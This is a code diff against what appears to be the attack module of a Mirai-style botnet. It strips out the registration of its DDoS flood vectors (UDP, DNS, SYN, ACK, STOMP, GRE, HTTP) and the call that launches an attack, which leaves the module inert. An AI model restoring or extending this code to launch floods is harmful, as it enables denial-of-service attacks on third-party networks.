@@ -21,24 +21,7 @@ int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
 
 BOOL attack_init(void)
 {
-    int i;
-
-    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
-    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
-    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
-	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
-
-    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
-    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
-    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
-
-    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
-    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
-
-    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
-    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
-
-    return TRUE;
+   return TRUE;
 }
 
 void attack_kill_all(void)
@@ -142,7 +125,6 @@ void attack_parse(char *buf, int len)
     }
 
     errno = 0;
-    attack_start(duration, vector, targs_len, targs, opts_len, opts);
 
     // Cleanup
     cleanup:
